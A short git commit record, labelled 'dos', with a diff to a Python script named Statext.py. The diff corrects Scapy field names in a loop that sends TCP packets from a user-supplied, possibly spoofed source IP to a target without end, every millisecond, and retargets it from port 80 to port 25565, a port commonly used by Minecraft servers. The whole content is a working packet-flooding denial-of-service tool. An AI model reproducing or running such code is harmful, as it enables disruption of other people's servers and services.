9bd2755880695fc9bc652135854b5f4fa400e826
ConWarOp <spitha3@hotmail.com>
2020-04-22 11:55:06 +0200

    dos

--- Statext.py
+++ Statext.py
@@ -5,8 +5,8 @@ source_port = int(input("Enter Source Port Number:"))
 i = 1
 
 while True:
-   IP1 = IP(source_IP = source_IP, destination = target_IP)
-   TCP1 = TCP(srcport = source_port, dstport = 80)
+   IP1 = IP(src = source_IP, dst = target_IP)
+   TCP1 = TCP(sport = source_port, dport = 25565)
    pkt = IP1 / TCP1
    send(pkt, inter = .001)
 
